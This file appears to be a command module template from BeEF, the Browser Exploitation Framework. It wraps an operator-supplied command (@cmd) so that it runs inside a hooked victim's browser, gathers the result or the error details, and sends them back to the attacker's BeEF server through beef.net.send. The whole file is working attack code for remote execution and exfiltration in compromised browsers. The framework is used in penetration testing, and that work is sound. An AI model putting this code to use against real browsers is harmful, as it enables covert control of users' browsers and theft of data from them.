//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
	var result; 

	try { 
		result = function() {<%= @cmd %>}(); 
	} catch(e) { 
		for(var n in e) 
			result+= n + " " + e[n] + "\n"; 
	} 
	
	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+result);
});





 
